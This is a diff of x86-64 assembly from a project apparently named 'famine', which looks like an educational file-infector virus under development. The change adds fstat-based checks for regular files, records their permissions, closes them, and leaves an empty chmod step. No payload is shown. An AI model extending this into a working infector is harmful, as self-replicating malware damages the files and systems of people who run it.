@@ -58,12 +58,40 @@ section .text
                 mov rdi, VAR(famine.fd_dir)
                 mov rdx, O_RDONLY
                 mov rax, SC_OPENAT
-                xor r10, r10
                 syscall
                 test rax, rax
                 jle .end_openat
                 mov VAR(famine.fd_file), rax
-                jmp .next_file
+                
+            .fstat:
+                sub rsp, 144                ;fstat struct buffer
+                mov rdi, rax
+                lea rsi, [rsp]
+                mov rax, SC_FSTAT
+                syscall
+                test rax, rax
+                jl .restore_stack
+                
+                ; file type
+                mov eax, dword [rsp + 24]   ; st-mode fstat struct 
+                and eax, S_IFMT             ; bytes file type
+                cmp eax, S_IFREG            ; reg file type
+                jne .close_file
+                mov eax, dword [rsp + 24]   ; st-mode again
+                and eax, 0o777
+                mov dword VAR(famine.file_permissions), eax
+                
+                .restore_stack:
+                    add rsp, 144 
+                    jmp .close_file
+            
+            .close_file:
+                mov rdi, VAR(famine.fd_file)
+                mov rax, SC_CLOSE
+                syscall
+
+            .chmod:
+
 
             .end_openat:
                 pop rax
@@ -91,7 +119,7 @@ section .text
             jnz .open_dir
 
         .exit:
+            TRACE_TEXT hello, 11
             mov rax, SC_EXIT
             syscall
-    
     
